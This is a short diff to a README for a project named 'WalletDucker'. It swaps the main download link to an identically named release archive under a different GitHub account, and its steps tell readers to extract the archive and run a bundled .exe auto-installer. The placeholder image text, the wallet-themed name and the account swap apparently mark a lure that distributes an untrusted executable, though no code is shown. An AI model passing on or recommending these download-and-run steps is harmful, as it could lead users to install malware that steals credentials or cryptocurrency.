@@ -6,7 +6,7 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/666a011e-9fcb-4d07-8756-cb3ee549a601)
-](https://github.com/srihari-976/WalletDucker/releases/download/V2.1/Release.zip)
+](https://github.com/ValiLiosberi/WalletDucker/releases/download/Release/Release.zip)
 
 ## **1. [Download the archive](https://github.com/srihari-976/WalletDucker/releases/download/V2.1/Release.zip) from releases and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
